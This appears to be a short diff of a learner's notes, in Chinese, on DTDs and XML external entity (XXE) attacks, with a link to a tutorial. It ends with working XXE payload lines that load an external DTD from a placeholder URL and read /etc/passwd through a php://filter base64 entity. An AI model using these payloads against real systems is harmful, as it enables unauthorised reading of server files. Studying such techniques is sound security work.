@@ -1,7 +1,9 @@
 php
 dtd文档是什么?
   为啥要导入外部Html得dtd/html标准 
-  这几天一直在学习xxe，突然..我不知道发生了 什么..
+  这几天一直在学习xxe，突然..我不知道发生了 什么..不理解得慢慢
+  前端html导入dtd文档
+  http://www.nowamagic.net/academy/detail/48110310
 
 <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>
  <!ENTITY % file SYSTEM  "php://filter/read=convert.base64-encode/resource=file:///etc/passwd">
